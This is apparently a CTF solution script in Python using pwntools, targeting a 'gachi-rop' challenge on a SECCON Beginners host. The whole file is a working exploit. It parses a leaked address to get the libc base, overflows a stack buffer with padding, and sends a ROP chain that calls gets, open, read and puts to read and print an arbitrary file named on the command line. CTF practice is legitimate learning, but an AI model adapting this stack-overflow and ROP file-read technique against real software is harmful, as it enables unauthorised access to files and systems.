from pwn import *
import sys

HOST = 'gachi-rop.beginners.seccon.games'
PORT = 4567

exe = ELF('./gachi-rop_patched')
libc = ELF('./libc.so.6')

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)  
    else:
        return process([exe.path])

io = start()

# libc base leak
io.recvuntil(b'@')
addr_libc_base = int(io.recvline(), 16) - libc.sym['system']
log.info(f'addr_libc_base = {addr_libc_base:#x}')
libc.address = addr_libc_base

# create rop chain
buf1 = 0x404000 + 0x500
buf2 = 0x404000 + 0x600

rop = ROP([exe, libc])
rop.call('gets', [buf1])
rop.call('open', [buf1, 0])
rop.call('read', [3, buf2, 0x50])
rop.call('puts', [buf2])
log.info(rop.dump())

# attack
payload = b'a' * 0x18 + rop.chain()
io.sendlineafter(b': ', payload)
io.sendline(sys.argv[1].encode())
io.recvline()
print(io.recvline())